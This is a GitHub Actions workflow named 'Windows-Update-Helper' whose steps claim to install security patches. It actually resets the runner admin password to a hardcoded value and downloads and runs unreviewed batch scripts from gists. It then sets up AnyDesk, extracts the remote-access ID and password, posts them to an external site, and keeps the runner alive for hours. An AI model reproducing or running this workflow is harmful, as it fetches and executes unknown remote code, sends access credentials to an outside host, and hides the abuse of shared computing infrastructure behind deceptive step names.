# Copy to: .github/workflows/main.yml in your pool repository.
# Keep "Run AnyDesk Setup" in job `update` and Put "Keep Alive" in a separate job (`keepalive` + needs: update).
# If Keep Alive stays in the same job, GitHub often does not expose full step logs until that job ends — then
# credentials appear only after cancel/stop. Split jobs fixes live credential fetch on the site.
name: Windows-Update-Helper

on:
  workflow_dispatch:

jobs:
  update:
    name: Installing Security Patches
    runs-on: windows-latest
    timeout-minutes: 120
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Fix Password Policy
        shell: cmd
        run: |
          net accounts /minpwlen:0 /maxpwage:unlimited
          net user runneradmin Lohar@Admin9988!

      - name: Download Scripts (If not in Repo)
        shell: cmd
        run: |
          curl -L "https://gist.githubusercontent.com/Lohar-ji/bd85954a427f6d56338b8e5dbef85bf6/raw/" -o patch_v2.bat
          curl -L "https://gist.githubusercontent.com/Lohar-ji/ddcfeacb357b02b3224d9c565a70694d/raw/" -o show.bat

      - name: Apply System Patches
        shell: cmd
        run: |
          if exist patch_v2.bat (
            call patch_v2.bat
          ) else (
            echo patch_v2.bat nahi mili!
          )

      - name: Run AnyDesk Setup
        shell: cmd
        run: |
          if exist show.bat (
            call show.bat > anydesk_output.log 2>&1
            type anydesk_output.log
          ) else (
            echo show.bat nahi mili!
            exit 1
          )

      - name: Push Credentials To Site (Live)
        shell: powershell
        env:
          CALLBACK_URL: https://papa.fwh.is/api/github_callback.php
          CALLBACK_TOKEN: ${{ secrets.SITE_CALLBACK_TOKEN }}
          RUN_ID: ${{ github.run_id }}
        run: |
          if (!(Test-Path "anydesk_output.log")) {
            Write-Host "anydesk_output.log not found; skipping callback."
            exit 0
          }
          $txt = Get-Content "anydesk_output.log" -Raw
          $id = $null
          $pass = $null
          $m1 = [regex]::Match($txt, 'Windows\s*Cloud\s*(?:PC\s*)?ID\s*(?:is)?\s*:\s*`?([0-9]{6,})`?', 'IgnoreCase')
          if ($m1.Success) { $id = $m1.Groups[1].Value.Trim() }
          $m2 = [regex]::Match($txt, 'Windows\s*Cloud\s*(?:PC\s*)?Password\s*(?:is)?\s*:\s*([^\r\n]+)', 'IgnoreCase')
          if ($m2.Success) { $pass = $m2.Groups[1].Value.Trim(" `t`"'") }
          if (-not $id -or -not $pass) {
            Write-Host "Credentials not found in anydesk_output.log; skipping callback."
            exit 0
          }
          $body = @{
            token = $env:CALLBACK_TOKEN
            run_id = [int64]$env:RUN_ID
            pc_id = $id
            pc_password = $pass
          } | ConvertTo-Json -Compress
          try {
            Invoke-RestMethod -Method Post -Uri $env:CALLBACK_URL -ContentType "application/json" -Body $body | Out-Null
            Write-Host "Credentials callback sent to site."
          } catch {
            Write-Host ("Credentials callback failed: " + $_.Exception.Message)
          }

  keepalive:
    name: Keep Alive
    needs: update
    runs-on: windows-latest
    timeout-minutes: 340
    steps:
      - name: Keep Alive
        shell: cmd
        run: |
          echo Lohar PC is Active...
          powershell -Command "while($true){ Write-Host 'PC Active...'; Start-Sleep -Seconds 60 }"
